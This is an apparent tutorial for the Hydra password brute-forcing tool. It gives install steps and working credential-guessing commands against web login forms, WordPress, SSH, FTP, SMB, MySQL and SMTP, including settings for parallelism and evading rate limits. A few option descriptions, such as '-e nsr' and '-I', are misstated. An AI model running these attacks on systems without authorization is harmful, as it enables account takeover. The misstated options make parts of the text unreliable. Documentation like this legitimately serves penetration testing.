## Getting Started with Hydra

<Steps>
  <Step title="Install Hydra">
    Hydra comes pre-installed in many security-focused Linux distributions like Kali Linux. For other systems:
    
    **Debian/Ubuntu**:
    ```bash
    sudo apt update
    sudo apt install hydra
    ```
    
    **Fedora/RHEL**:
    ```bash
    sudo dnf install hydra
    ```
    
    **macOS (using Homebrew)**:
    ```bash
    brew install hydra
    ```
    
    **From Source**:
    ```bash
    git clone https://github.com/vanhauser-thc/thc-hydra.git
    cd thc-hydra
    ./configure
    make
    make install
    ```
  </Step>
  <Step title="Verify Installation">
    Test your installation by running:
    ```bash
    hydra -h
    ```
    
    This should display the help menu with available options and supported protocols.
  </Step>
  <Step title="Understand Basic Syntax">
    The basic syntax for Hydra is:
    ```bash
    hydra [options] [-s PORT] TARGET PROTOCOL [MODULE-OPTIONS]
    ```
    
    For example, to perform an FTP brute force attack:
    ```bash
    hydra -l user -P wordlist.txt ftp://192.168.1.1
    ```
    
    Where:
    - `-l user`: Specifies a single username
    - `-P wordlist.txt`: Specifies a password list file
    - `ftp://192.168.1.1`: Target protocol and IP address
  </Step>
</Steps>

## Supported Protocols

Hydra supports a wide range of protocols, including but not limited to:

| Category | Protocols |
|----------|-----------|
| Remote Access | SSH, Telnet, rlogin, rsh |
| File Transfer | FTP, FTPS, SFTP |
| Web | HTTP(S), HTTP-FORM-GET, HTTP-FORM-POST, HTTP-PROXY |
| Mail | SMTP, POP3, IMAP |
| Databases | MySQL, PostgreSQL, Oracle, MS-SQL, MongoDB |
| Directory Services | LDAP, SMB/CIFS |
| VoIP | SIP, Asterisk |
| Other | VNC, RDP, Cisco, Cisco-enable, CVS |

## Common Attack Methods

<Tabs defaultValue="http-form" className="pt-5 pb-1">
  <TabsList>
    <TabsTrigger value="http-form">HTTP Form</TabsTrigger>
    <TabsTrigger value="ssh">SSH</TabsTrigger>
    <TabsTrigger value="ftp">FTP</TabsTrigger>
    <TabsTrigger value="smb">SMB</TabsTrigger>
  </TabsList>
  <TabsContent value="http-form">
    HTTP Form-based authentication is one of the most common targets for Hydra. The syntax for attacking web forms is:
    
    ```bash
    hydra -l username -P passwords.txt target.com http-post-form "/login.php:username=^USER^&password=^PASS^:Failed login"
    ```
    
    The http-post-form parameter consists of three parts separated by colons:
    1. The URL path of the form
    2. The form parameters with ^USER^ and ^PASS^ as placeholders
    3. The error message indicating a failed login attempt
    
    For GET requests, use http-get-form instead of http-post-form.
  </TabsContent>
  <TabsContent value="ssh">
    SSH is a common protocol to test during penetration tests:
    
    ```bash
    hydra -l root -P passwords.txt ssh://192.168.1.1 -t 4
    ```
    
    The `-t 4` option limits the number of parallel connections to 4, which is recommended for SSH to avoid connection refusals.
    
    For using a key file instead of a password:
    ```bash
    hydra -L users.txt -e nsr ssh://192.168.1.1
    ```
    
    The `-e nsr` option tries:
    - n: null password
    - s: same as login
    - r: reversed login
  </TabsContent>
  <TabsContent value="ftp">
    FTP servers are often targeted for brute force attacks:
    
    ```bash
    hydra -L users.txt -P passwords.txt ftp://192.168.1.1
    ```
    
    For FTP on a non-standard port:
    ```bash
    hydra -L users.txt -P passwords.txt -s 2121 192.168.1.1 ftp
    ```
    
    The `-s 2121` option specifies the port number.
  </TabsContent>
  <TabsContent value="smb">
    SMB/CIFS is commonly used in Windows environments:
    
    ```bash
    hydra -l administrator -P passwords.txt 192.168.1.1 smb
    ```
    
    For targeting a specific Windows domain:
    ```bash
    hydra -l administrator -P passwords.txt -m "WORKGROUP" 192.168.1.1 smb
    ```
    
    The `-m` option allows passing additional parameters to the module, in this case, the domain name.

## Advanced Options

### Parallelization and Performance Tuning

Control the number of parallel tasks and optimize performance:

```bash
hydra -l admin -P passwords.txt -t 16 -f -V 192.168.1.1 http-post-form "/admin:username=^USER^&password=^PASS^:Login failed"
```

- `-t 16`: Use 16 parallel connections
- `-f`: Stop after finding a valid credential pair
- `-V`: Verbose mode, showing login attempts

### Username and Password Lists

Hydra offers flexible options for username and password inputs:

```bash
hydra -L users.txt -P passwords.txt 192.168.1.1 ftp
```

- `-L users.txt`: List of usernames
- `-P passwords.txt`: List of passwords
- `-C credentials.txt`: Combined username:password format

### Output and Reporting

Save results to various formats:

```bash
hydra -l admin -P passwords.txt 192.168.1.1 ssh -o ssh_results.txt
```

- `-o ssh_results.txt`: Output results to a text file
- `-b json`: Output in JSON format
- `-I`: Show each attempt (very verbose)

<Note>
Always ensure you have proper authorization before using Hydra against any system. Unauthorized password cracking attempts are illegal and unethical.
</Note>

## Practical Examples

### WordPress Login Brute Force

```bash
hydra -l admin -P wordlist.txt 192.168.1.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered"
```

### SSH with Rate Limiting

```bash
hydra -l root -P passwords.txt ssh://192.168.1.1 -t 4 -W 5
```

The `-W 5` option adds a 5-second delay between connection attempts to avoid triggering rate limiting.

### MySQL Database

```bash
hydra -l root -P passwords.txt 192.168.1.1 mysql
```

### SMTP Authentication

```bash
hydra -l user@example.com -P passwords.txt smtp://mail.example.com -v
```
